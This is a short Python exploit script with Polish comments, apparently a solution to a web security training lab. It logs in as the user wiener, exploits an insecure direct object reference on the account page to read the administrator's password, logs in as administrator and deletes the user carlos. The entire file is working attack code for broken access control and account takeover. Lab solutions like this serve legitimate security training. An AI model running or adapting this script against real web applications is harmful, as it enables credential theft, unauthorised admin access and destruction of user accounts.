import requests
import sys
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(1)

    burp_url = sys.argv[1]
    session = requests.Session()

    # Request 1: Pobranie tokena CSRF z /login
    login_url = burp_url + "/login"
    response = session.get(login_url)
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
    csrf_token = csrf_token_match.group(1)

    # Request 2: Logowanie się użytkownikiem wiener:peter
    wiener_creds = {"csrf": csrf_token, "username": 'wiener', "password": 'peter'}
    session.post(login_url, data=wiener_creds)

    # Pobranie hasła administratora
    red_url = burp_url + '/my-account?id=administrator'
    response2 = session.get(red_url)
    find_pass = re.search(r'[A-Za-z0-9]{20}', response2.text)
    pass_key = find_pass.group(0)

    # Wylogowanie się
    logout_url = burp_url + "/logout"
    session.get(logout_url)

    # Pobranie nowego tokena CSRF z /login
    response = session.get(login_url)
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
    csrf_token = csrf_token_match.group(1)

    # Logowanie jako administrator
    burp_data = {"csrf": csrf_token, "username": 'administrator', "password": pass_key}
    session.post(login_url, data=burp_data)

    # Usunięcie użytkownika carlos
    delete_url = burp_url + '/admin/delete?username=carlos'
    response = session.get(delete_url)
    print(response.text)
